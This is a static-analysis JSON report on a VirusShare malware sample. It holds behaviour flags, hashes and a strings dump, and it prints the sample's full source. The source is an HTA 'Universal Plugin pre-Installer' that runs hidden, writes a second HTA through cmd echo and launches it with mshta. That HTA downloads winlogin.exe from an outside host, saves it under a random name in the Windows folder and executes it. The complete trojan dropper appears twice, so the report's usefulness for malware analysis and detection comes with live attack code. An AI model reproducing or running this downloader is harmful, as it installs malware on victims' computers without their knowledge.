{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "Chr": "May attempt to obfuscate specific str",
            "CreateObject": "May create an OLE object",
            "Microsoft.XMLHTTP": "May download files from the Internet",
            "Open": "May open a file",
            "Shell": "May run an executable file or a system command",
            "Shell.Application": "May run an application",
            "ShellExecute": "May run an executable file or a system command",
            "Write": "May write to a file"
        },
        "macro": "<HTML><HEAD><TITLE>Universal Plugin pre-Installer</TITLE>\n<HTA:APPLICATION id=PlugInst\nAPPLICATIONNAME=\"Plugin Installer\"\nSHOWINTASKBAR=NO\nCAPTION=YES\nSINGLEINSTANCE=YES\nMAXIMIZEBUTTON=NO\nMINIMIZEBUTTON=NO\nWINDOWSTATE=MINIMIZE\n/></HEAD>\n<BODY>\n\n<TEXTAREA id=\"Main_HTA\">\n<HTML><HEAD>\n<HTA:APPLICATION id=PXP\n APPLICATIONNAME=\"PXP\"\n SHOWINTASKBAR=NO\n CAPTION=YES\n SINGLEINSTANCE=YES\n MAXIMIZEBUTTON=NO\n MINIMIZEBUTTON=NO\n WINDOWSTATE=MINIMIZE\n />\n</HEAD>\n<BODY>\n<SCRIPT> \nfunction Dl(Rp,Ln)\n{\ntry\n{\nvar SC=new ActiveXObject(\"MSScriptControl.ScriptControl\");  \nSC.Language=\"JavaScript\";  \nSC.Reset();\nvar oX=new ActiveXObject(\"Microsoft.XMLHTTP\"); \noX.Open(\"GET\",Rp,0); \noX.Send();   \nsAX=unescape(\"%41DODB%2eStream\");\nvar oS=new ActiveXObject(sAX); \nSC.AddObject(\"oAS\", oS);\nSC.AddObject(\"oXS\", oX);\nvar oA=new ActiveXObject(\"Shell.Application\");\naC=\"var XB=oXS.responseBody;oAS.Type=1;oAS.Mode=3;oAS.Open();oAS.Write(XB);\"+\"oAS.Sa\"+\"veToFile('\"+Ln+\"',2);\";\nSC.ExecuteStatement(aC);\noA.ShellExecute(Ln);\n}\ncatch(e){}\n}\nself.moveTo(5000,5000);\n</TEXTAREA>\n\n<SCRIPT language=\"VBScript\">\nssfDESKTOP = 0\n     ssfPROGRAMS = 2\n     ssfSTARTMENU = 11\n     ssfDESKTOPDIRECTORY = 16\n     ssfFONTS=20\n     ssfCOMMONSTARTMENU = 22\n     ssfCOMMONPROGRAMS = 23\n     ssfCOMMONSTARTUP = 24\n     ssfCOMMONDESKTOPDIR = 25\n     ssfCOMMONALTSTARTUP = 30\n     ssfCOMMONFAVORITES = 31\n     ssfCOMMONAPPDATA = 35\n     ssfWINDOWS = 36\n     ssfSYSTEM = 37\n    \n     Dim oShellApp\n     Dim oFolder\n     Dim oFolderItem\n     Dim WinDir\n     Dim Main_HTA_Body\n     Dim Cmd_Params\n     Dim Trojan_Path\n     Dim IntervalID\n     Dim nCmdCalled\n     \n     nCmdCalled=0\n     InitPaths()\n     Randomize\n\n     self.MoveTo 6000,6000\n \n     ExeName=GenerateName()\n     ExeName=ExeName & \".exe\"\n     HTAName=GenerateName()\n     HTAName=HTAName & \".hta\" \n      \n     Set oShellApp = CreateObject(\"Shell.Application\")\n     Set oFolder = oShellApp.NameSpace(ssfFONTS)\n     Set oFolderItem=oFolder.ParseName(\"Symbol.ttf\")\n     Font_Path_Components=Split(oFolderItem.Path,\"\\\",-1,1)\n     WinDir= Font_Path_Components(0) & \"\\\" &  Font_Path_Components(1) & \"\\\"\n     ExeName=WinDir & ExeName\n     HTAName=WinDir & HTAName\n\n     Call Run_Installer \n     setTimeout \"HangUp()\",9000\n       \nSub  Run_Installer\n     \n     Main_HTA_Body=document.all.Main_HTA.innerText\n     Download_Call=\"Dl('\" & Trojan_Path & \"'\"  & \",\" & \"'\" & ExeName & \"'\" & \");\"\n     Download_Call=Replace(Download_Call,\"\\\",\"\\\\\\\\\")\n     Main_HTA_Body= Main_HTA_Body &  Download_Call\n     Main_HTA_Body= Main_HTA_Body & \"self.close();</SCR\" & \"IPT></BODY></HTML>\"\n     Main_HTA_Body=Replace(Main_HTA_Body,vbCrLf,\"\")\n     Main_HTA_Body=Replace(Main_HTA_Body,\">\",\"^>\")\n     Main_HTA_Body=Replace(Main_HTA_Body,\"<\",\"^<\")\n\n\n            // Create an additional HTA file (can't be greater than 1000 bytes) \n  \n            Cmd_Params=\"/c echo \" & Main_HTA_Body & \" > \" & HTAName\n            oShellApp.ShellExecute \"cmd\",Cmd_Params,\"open\"\n            oShellApp.ShellExecute \"mshta\",HTAName\n            Cmd_Params=\"/c del \" &  HTAName\n            IntervalID=setInterval(\"Delete_HTA(Cmd_Params)\",3000)  \nEnd  Sub \n\nFunction HangUp()\n         clearInterval(IntervalID)\n         self.Close\nEnd      Function\n\nFunction Delete_HTA(params)\n        If nCmdCalled<4 Then\n           oShellApp.ShellExecute \"cmd\",params\n           nCmdCalled=nCmdCalled+1\n        End If\nEnd Function   \n\nFunction GenerateName()\nRandomName=\"\"\nrr=Int(8*Rnd)\nik=0\nDo\nii=Int(25*Rnd)+97\nRandomName=RandomName+Chr(ii)\nik=ik+1\nLoop While ik<rr\nGenerateName=RandomName\nEnd Function\n\nFunction InitPaths\nTrojan_Path=\"http://www.jgutierrez.net/winlogin.exe\" \nEnd Function\n</SCRIPT>\n\n</BODY></HTML>\n"
    },
    "filename": "VirusShare_1eec26fd80e2532f5e6fc565af466c18",
    "filesize": 3820,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "1eec26fd80e2532f5e6fc565af466c18",
        "sha1": "3a7b745c96de8ea04f551de176d1d2007b1006fa",
        "sha256": "5456ecb3a5ab85981eae95316b708e313d8c4f80c6f93129fcb8b39ca3a11d8f"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<HTML><HEAD><TITLE>Universal Plugin pre-Installer</TITLE>",
            "<HTA:APPLICATION id=PlugInst",
            "APPLICATIONNAME=\"Plugin Installer\"",
            "SHOWINTASKBAR=NO",
            "CAPTION=YES",
            "SINGLEINSTANCE=YES",
            "MAXIMIZEBUTTON=NO",
            "MINIMIZEBUTTON=NO",
            "WINDOWSTATE=MINIMIZE",
            "/></HEAD>",
            "<BODY>",
            "<TEXTAREA id=\"Main_HTA\">",
            "<HTML><HEAD>",
            "<HTA:APPLICATION id=PXP",
            " APPLICATIONNAME=\"PXP\"",
            " SHOWINTASKBAR=NO",
            " CAPTION=YES",
            " SINGLEINSTANCE=YES",
            " MAXIMIZEBUTTON=NO",
            " MINIMIZEBUTTON=NO",
            " WINDOWSTATE=MINIMIZE",
            "</HEAD>",
            "<BODY>",
            "<SCRIPT> ",
            "function Dl(Rp,Ln)",
            "var SC=new ActiveXObject(\"MSScriptControl.ScriptControl\");  ",
            "SC.Language=\"JavaScript\";  ",
            "SC.Reset();",
            "var oX=new ActiveXObject(\"Microsoft.XMLHTTP\"); ",
            "oX.Open(\"GET\",Rp,0); ",
            "oX.Send();   ",
            "sAX=unescape(\"%41DODB%2eStream\");",
            "var oS=new ActiveXObject(sAX); ",
            "SC.AddObject(\"oAS\", oS);",
            "SC.AddObject(\"oXS\", oX);",
            "var oA=new ActiveXObject(\"Shell.Application\");",
            "aC=\"var XB=oXS.responseBody;oAS.Type=1;oAS.Mode=3;oAS.Open();oAS.Write(XB);\"+\"oAS.Sa\"+\"veToFile('\"+Ln+\"',2);\";",
            "SC.ExecuteStatement(aC);",
            "oA.ShellExecute(Ln);",
            "catch(e){}",
            "self.moveTo(5000,5000);",
            "</TEXTAREA>",
            "<SCRIPT language=\"VBScript\">",
            "ssfDESKTOP = 0",
            "     ssfPROGRAMS = 2",
            "     ssfSTARTMENU = 11",
            "     ssfDESKTOPDIRECTORY = 16",
            "     ssfFONTS=20",
            "     ssfCOMMONSTARTMENU = 22",
            "     ssfCOMMONPROGRAMS = 23",
            "     ssfCOMMONSTARTUP = 24",
            "     ssfCOMMONDESKTOPDIR = 25",
            "     ssfCOMMONALTSTARTUP = 30",
            "     ssfCOMMONFAVORITES = 31",
            "     ssfCOMMONAPPDATA = 35",
            "     ssfWINDOWS = 36",
            "     ssfSYSTEM = 37",
            "    ",
            "     Dim oShellApp",
            "     Dim oFolder",
            "     Dim oFolderItem",
            "     Dim WinDir",
            "     Dim Main_HTA_Body",
            "     Dim Cmd_Params",
            "     Dim Trojan_Path",
            "     Dim IntervalID",
            "     Dim nCmdCalled",
            "     ",
            "     nCmdCalled=0",
            "     InitPaths()",
            "     Randomize",
            "     self.MoveTo 6000,6000",
            "     ExeName=GenerateName()",
            "     ExeName=ExeName & \".exe\"",
            "     HTAName=GenerateName()",
            "     HTAName=HTAName & \".hta\" ",
            "      ",
            "     Set oShellApp = CreateObject(\"Shell.Application\")",
            "     Set oFolder = oShellApp.NameSpace(ssfFONTS)",
            "     Set oFolderItem=oFolder.ParseName(\"Symbol.ttf\")",
            "     Font_Path_Components=Split(oFolderItem.Path,\"\\\",-1,1)",
            "     WinDir= Font_Path_Components(0) & \"\\\" &  Font_Path_Components(1) & \"\\\"",
            "     ExeName=WinDir & ExeName",
            "     HTAName=WinDir & HTAName",
            "     Call Run_Installer ",
            "     setTimeout \"HangUp()\",9000",
            "       ",
            "Sub  Run_Installer",
            "     ",
            "     Main_HTA_Body=document.all.Main_HTA.innerText",
            "     Download_Call=\"Dl('\" & Trojan_Path & \"'\"  & \",\" & \"'\" & ExeName & \"'\" & \");\"",
            "     Download_Call=Replace(Download_Call,\"\\\",\"\\\\\\\\\")",
            "     Main_HTA_Body= Main_HTA_Body &  Download_Call",
            "     Main_HTA_Body= Main_HTA_Body & \"self.close();</SCR\" & \"IPT></BODY></HTML>\"",
            "     Main_HTA_Body=Replace(Main_HTA_Body,vbCrLf,\"\")",
            "     Main_HTA_Body=Replace(Main_HTA_Body,\">\",\"^>\")",
            "     Main_HTA_Body=Replace(Main_HTA_Body,\"<\",\"^<\")",
            "            // Create an additional HTA file (can't be greater than 1000 bytes) ",
            "            Cmd_Params=\"/c echo \" & Main_HTA_Body & \" > \" & HTAName",
            "            oShellApp.ShellExecute \"cmd\",Cmd_Params,\"open\"",
            "            oShellApp.ShellExecute \"mshta\",HTAName",
            "            Cmd_Params=\"/c del \" &  HTAName",
            "            IntervalID=setInterval(\"Delete_HTA(Cmd_Params)\",3000)  ",
            "End  Sub ",
            "Function HangUp()",
            "         clearInterval(IntervalID)",
            "         self.Close",
            "End      Function",
            "Function Delete_HTA(params)",
            "        If nCmdCalled<4 Then",
            "           oShellApp.ShellExecute \"cmd\",params",
            "           nCmdCalled=nCmdCalled+1",
            "        End If",
            "End Function   ",
            "Function GenerateName()",
            "RandomName=\"\"",
            "rr=Int(8*Rnd)",
            "ik=0",
            "ii=Int(25*Rnd)+97",
            "RandomName=RandomName+Chr(ii)",
            "ik=ik+1",
            "Loop While ik<rr",
            "GenerateName=RandomName",
            "End Function",
            "Function InitPaths",
            "Trojan_Path=\"http://www.jgutierrez.net/winlogin.exe\" ",
            "End Function",
            "</SCRIPT>",
            "</BODY></HTML>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.jgutierrez.net/winlogin.exe"
        ]
    },
    "time": "0:00:00.279443",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
